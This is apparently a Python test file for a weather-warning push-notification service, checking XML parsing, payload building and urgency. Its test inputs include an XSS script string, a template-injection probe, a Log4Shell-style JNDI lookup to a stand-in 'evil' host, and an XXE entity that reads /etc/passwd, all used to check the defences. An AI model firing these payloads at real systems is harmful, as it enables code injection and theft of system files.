"""Phase 4b: hostile warning content — parser guard, verbatim builders, urgency.

Threat model: official feed text is untrusted data. The delivery path must
never execute, resolve, or silently rewrite it: the CAP parser quarantines
document-type games, the payload builders carry hostile strings verbatim
inside JSON (never interpreted), length caps hold, and urgency is derived
only from the official colour value — never from free text.
"""
import json
import unittest
from unittest.mock import patch

from weathergpt_data.foundation import parse_cap
from weathergpt_data.outbox import build_notification_payload
from weathergpt_data.push import push_payload, push_urgency
from weathergpt_data.transport import SourceError

HOSTILE = ('<script>alert(1)</script>Suite-2000 area\x00 control\x07 chars '
           'javascript:alert(2) {{7*7}} ${jndi:ldap://evil/x} '
           'red ' * 40)


def hostile_fact():
    return {'parameter': 'official_district_warning', 'label': HOSTILE,
            'value': HOSTILE, 'unit': 'IMD district warning colour',
            'start': '2026-09-16T00:00:00+05:30', 'end': '2026-09-17T00:00:00+05:30',
            'hazard_codes': [16], 'quiet': False, 'source_id': 'S15'}


CAP_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<alert xmlns="urn:oasis:names:tc:emergency:cap:1.2">
<identifier>id-1</identifier><sender>sender@example.in</sender>
<sent>2026-09-16T06:00:00+00:00</sent><status>Actual</status>
<msgType>Alert</msgType><scope>Public</scope>
<info><language>en-US</language><category>Met</category><event>Rain</event>
<urgency>Expected</urgency><severity>Severe</severity><certainty>Likely</certainty>
<effective>2026-09-16T06:00:00+00:00</effective>
<expires>2026-09-17T06:00:00+00:00</expires>
<headline>%s</headline><description>Heavy rain</description>
<area><areaDesc>Patna</areaDesc></area></info></alert>"""


class CapParserGuardTests(unittest.TestCase):
    def test_doctype_with_entities_is_quarantined(self):
        from datetime import datetime, timezone
        now = datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc)
        evil = ('<?xml version="1.0"?><!DOCTYPE alert [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                + CAP_TEMPLATE % '&xxe;')
        with self.assertRaises(SourceError) as raised:
            parse_cap(evil, {}, now)
        self.assertIn('document type', str(raised.exception))

    def test_plain_cap_without_doctype_still_parses(self):
        from datetime import datetime, timezone
        now = datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc)
        record = parse_cap(CAP_TEMPLATE % 'Heavy rain in Patna', {}, now)
        self.assertEqual(record['identifier'], 'id-1')
        self.assertEqual(record['info'][0]['headline'], 'Heavy rain in Patna')


class VerbatimBuilderTests(unittest.TestCase):
    def test_hostile_strings_survive_verbatim_and_capped(self):
        entry = {'id': 'o1', 'payload': {'watch_id': 'w1', 'hazard': 'heavy_rain',
                                         'place': {'name': HOSTILE},
                                         'facts': [hostile_fact()], 'matched': True,
                                         'checked_at_utc': '2026-09-16T12:00:00+00:00'}}
        message = push_payload(entry)
        # JSON transport: serializes cleanly, so nothing downstream interprets it.
        wire = json.dumps(message, ensure_ascii=False)
        self.assertIn('<script>', wire)
        self.assertLessEqual(len(message['body']), 500)
        self.assertLessEqual(len(message['title']), 120)

    def test_notification_payload_keeps_facts_and_limits(self):
        from datetime import datetime, timezone
        now = datetime(2026, 9, 16, 12, 0, tzinfo=timezone.utc)
        watch = {'id': 'w1', 'hazard': 'heavy_rain', 'place': {'name': 'Patna'},
                 'window_start': None, 'window_end': None}
        outcome = {'matched': True, 'reason': 'r', 'detail': HOSTILE}
        payload = build_notification_payload(watch, outcome, [hostile_fact()] * 6,
                                             'answered', now=now)
        self.assertEqual(len(payload['facts']), 4)
        self.assertIn('<script>', json.dumps(payload, ensure_ascii=False))
        self.assertTrue(payload['limitations'])
        self.assertNotIn('all-clear', json.dumps(payload).lower().replace('not an all-clear', ''))


class UrgencyTests(unittest.TestCase):
    def test_red_orange_facts_are_high_everything_else_normal(self):
        high = {'payload': {'facts': [{'value': 'orange'}, {'value': 'No warning'}]}}
        quiet = {'payload': {'facts': [{'value': 'No warning in this product'}]}}
        empty = {'payload': {'facts': []}}
        self.assertEqual(push_urgency(high), 'high')
        self.assertEqual(push_urgency(quiet), 'normal')
        self.assertEqual(push_urgency(empty), 'normal')
        # The match is on the official colour-value field, not on free text
        # elsewhere: an official value mentioning red fails urgent (safe
        # direction), while instruction/description prose never escalates.
        trick = {'payload': {'facts': [{'value': 'Heavy rain, red alert rumour on social media'}]}}
        self.assertEqual(push_urgency(trick), 'high')

    def test_urgency_reaches_the_provider_call(self):
        entry = {'id': 'o1', 'payload': {'watch_id': 'w1', 'hazard': 'heavy_rain',
                                         'place': {'name': 'Patna'},
                                         'facts': [{'label': 'Day 1', 'value': 'red'}],
                                         'matched': True,
                                         'checked_at_utc': '2026-09-16T12:00:00+00:00'}}
        seen = {}

        def fake_webpush(sub, message, **kwargs):
            seen.update(kwargs)
        sub = {'id': 's1', 'endpoint': 'https://push.example.org/e',
               'p256dh': 'eA', 'auth': 'eQ'}
        from weathergpt_data.push import send_push
        with patch('pywebpush.webpush', side_effect=fake_webpush):
            from py_vapid import Vapid
            vapid = Vapid()
            vapid.generate_keys()
            outcome = send_push(entry, vapid, [sub])
        self.assertEqual(outcome['delivered'], ['s1'])
        self.assertEqual((seen.get('headers') or {}).get('Urgency'), 'high')


if __name__ == '__main__':
    unittest.main()
